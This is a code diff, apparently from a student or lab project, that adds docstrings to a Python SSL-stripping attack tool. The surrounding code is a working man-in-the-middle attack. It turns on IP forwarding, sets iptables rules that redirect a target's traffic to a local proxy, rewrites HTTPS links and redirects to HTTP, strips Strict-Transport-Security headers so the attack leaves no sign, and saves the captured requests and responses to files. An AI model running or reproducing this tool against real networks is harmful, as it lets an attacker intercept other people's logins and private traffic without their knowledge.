@@ -7,7 +7,6 @@ import socket
 from BaseHTTPServer import *
 import threading
 import os
-import sys
 import string
 import time
 import ssl
@@ -17,6 +16,9 @@ class sslstrip:
         self.redirect_port = 8080
         
     def set_iptables(self, toRunning):
+        """
+        Set IP forwarding and add or remove iptables rules.
+        """
         if toRunning:
             os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
             run_iptables_command("sudo iptables -t nat -I PREROUTING 1 -p tcp  -j REDIRECT --to-port %s" % self.redirect_port)
@@ -30,15 +32,30 @@ class sslstrip:
             run_iptables_command("sudo iptables -D FORWARD -p udp --sport 53 -j ACCEPT")
 
     class HTTPStrippingProxy(BaseHTTPRequestHandler):
+        """
+        The proxy that handles forwarded requests.
+        """
+        
         def do_GET(self):
+            """
+            Handle GET request
+            """
             print("Received GET")
             self.handle_request()
             
         def do_POST(self):
+            """
+            Handle POST request
+            """
             print("Received POST")
             self.handle_request()
             
         def handle_request(self):
+            """
+            Modify and forward request to HTTPS
+            Read response from socket
+            Modify response and forward to target
+            """
             try:
                 # Get the host header to get the destination
                 host_header = self.headers.get('Host')
@@ -108,6 +125,9 @@ class sslstrip:
                 self.send_error(500, "internal error: %s" % e)                
         
         def save_file(self, name, content):
+            """
+            Save the content to a file in folder 'name'.
+            """
             if not os.path.exists(name):
                 os.mkdir(name)
             with open("%s/%s.txt" % (name, time.ctime()), 'w') as f:
@@ -117,6 +137,9 @@ class sslstrip:
         
                 
         def process_response(self, response):
+            """
+            Modify response.
+            """
             is_chunked = False
             if re.search(r"Transfer-Encoding: chunked", response, re.IGNORECASE):
                 is_chunked = True
@@ -149,6 +172,9 @@ class sslstrip:
             
                 
         def modify_header(self, header):
+            """
+            Modify headers so there is no indication of the attack.
+            """
             if header.lower().startswith('location: https://'):
                 return header.lower().replace('https://', 'http://')
             elif header.lower().startswith('strict-transport-security:'):
@@ -163,12 +189,19 @@ class sslstrip:
                 return header
             
         def modify_body(self, bodylines, is_chunked):
+            """
+            Modify body so there is no indication of the attack.
+            If the body was chunked, change it to non-chunked.
+            """
             if is_chunked:
                 bodylines = self.remove_hex(bodylines)
             body = ''.join(bodylines)
             return re.sub(r'https://', 'http://', body, flags=re.IGNORECASE)
         
         def remove_hex(self, lines):
+            """
+            Remove all lines that are a hex number.
+            """
             non_hex = []
             for s in lines:
                 is_hex = True
@@ -181,6 +214,9 @@ class sslstrip:
             return non_hex
             
         def receive_data(self, skt):
+            """
+            Read the socket and receive a response.
+            """
             bffr = ""
             
             # Read until end of header is found
@@ -224,10 +260,11 @@ class sslstrip:
             return headers + "\r\n\r\n" + body
                 
         def read_chunked_bytes(self, skt, bdy):
+            """
+            Recursive function to receive a chunked body
+            """
             # answer is chunked
             # there is at least one chunk in bdy
-            
-            #print("~~~~~~~~~~~~~~~~~~~~~~~~\nCurrently loaded:\n~%s~\n" % bdy)
             
             # Check if there is a \r\n in bdy, else the length is not fully loaded
             if "\r\n" not in bdy:
@@ -262,6 +299,9 @@ class sslstrip:
             
                 
         def receive_bytes(self, skt, size):
+            """
+            Receive a number of bytes from the socket
+            """
             bytes = ""
             bytes_read = 0
             while bytes_read < size:
@@ -275,6 +315,9 @@ class sslstrip:
             
             
     def start_http_proxy(self):
+        """
+        Start the http proxy
+        """
         try:
             print("Starting HTTP strippgin proxy on port %s" % self.redirect_port)
             self.http_server = HTTPServer(("", self.redirect_port), self.HTTPStrippingProxy)
@@ -284,6 +327,9 @@ class sslstrip:
             self.stop_http_proxy()
                 
     def start(self, target_ip, interface):
+        """
+        Start the SSL stripping attack
+        """
         try: 
             self.target_ip = target_ip
             self.interface = interface
@@ -306,6 +352,9 @@ class sslstrip:
             self.set_iptables(False)
     
     def stop(self):
+        """
+        Stop the SSL stripping attack
+        """
         print("Stopping ssl stripping attack")
         if self.http_server:
             self.http_server.shutdown()
